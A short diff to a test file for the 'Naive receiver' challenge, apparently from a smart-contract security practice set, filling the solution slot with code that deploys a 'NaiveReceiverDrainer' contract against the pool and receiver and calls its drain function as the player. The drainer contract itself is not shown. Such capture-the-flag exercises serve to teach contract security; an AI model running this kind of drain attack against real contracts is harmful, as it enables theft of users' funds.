@@ -38,6 +38,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let DrainerFactory = await ethers.getContractFactory('NaiveReceiverDrainer');
+        let drainer = await DrainerFactory.deploy(pool.address, receiver.address);
+        let drainerWithSigner = drainer.connect(player);
+        await drainerWithSigner.drain();
     });
 
     after(async function () {
